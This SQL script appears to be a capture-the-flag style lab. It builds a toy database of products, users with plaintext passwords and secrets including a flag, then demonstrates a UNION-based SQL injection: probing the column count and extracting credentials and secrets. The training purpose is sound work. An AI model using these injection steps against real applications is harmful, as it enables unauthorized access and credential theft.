-- 🧪 Drop tables if they exist (for clean setup)
DROP TABLE IF EXISTS secrets;
DROP TABLE IF EXISTS users;
DROP TABLE IF EXISTS products;

-- 🛒 Create products table (visible in app UI)
CREATE TABLE products (
    id INTEGER PRIMARY KEY,
    name TEXT NOT NULL,
    category TEXT NOT NULL,
    price REAL NOT NULL
);

-- Insert sample product data
INSERT INTO products (id, name, category, price) VALUES
(1, 'Wireless Mouse', 'Electronics', 29.99),
(2, 'Notebook', 'Stationery', 4.99),
(3, 'Coffee Mug', 'Home', 8.50),
(4, 'Headphones', 'Electronics', 79.99);

-- 👤 Create users table (hidden sensitive data)
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password TEXT NOT NULL,
    UNIQUE (username(255)) -- 🔐 Add key length here
);

-- Insert user credentials
INSERT INTO users (id, username, password) VALUES
(1, 'admin', 'SecurePass123'),
(2, 'alice', 'Pa$$w0rd'),
(3, 'bob', 'qwerty123');

-- 🔐 Create secrets table (internal sensitive info)
CREATE TABLE secrets (
    secret_id INTEGER PRIMARY KEY,
    secret_name TEXT NOT NULL,
    secret_value TEXT NOT NULL
);

-- Insert example secrets
INSERT INTO secrets (secret_id, secret_name, secret_value) VALUES
(1, 'API_KEY', 'ABCD1234-EFGH5678-IJKL90MN'),
(2, 'DB_PASSWORD', 'SuperSecretDBPass123'),
(3, 'FLAG', 'union_attack_success');


SELECT name, price FROM products WHERE category = 'Electronics' ORDER BY 1--;
SELECT name, price FROM products WHERE category = 'Electronics' UNION SELECT NULL,NULL--;
SELECT name, price FROM products WHERE category = 'Electronics' UNION SELECT username,password FROM users--;




-- Simulate original query
SELECT name, price FROM products WHERE category = 'Electronics';

-- Determine column count using ORDER BY
SELECT name, price FROM products WHERE category = 'Electronics' ORDER BY 1--;
SELECT name, price FROM products WHERE category = 'Electronics' ORDER BY 2--;
SELECT name, price FROM products WHERE category = 'Electronics' ORDER BY 3--;

-- Determine column count using UNION
SELECT name, price FROM products WHERE category = 'Electronics' UNION SELECT NULL,NULL--;
SELECT name, price FROM products WHERE category = 'Electronics' UNION SELECT NULL,NULL,NULL--;

-- Extract usernames and passwords
SELECT name, price FROM products WHERE category = 'Electronics' UNION SELECT username,password FROM users--;

-- Extract secrets
SELECT name, price FROM products WHERE category = 'Electronics' UNION SELECT secret_name,secret_value FROM secrets--;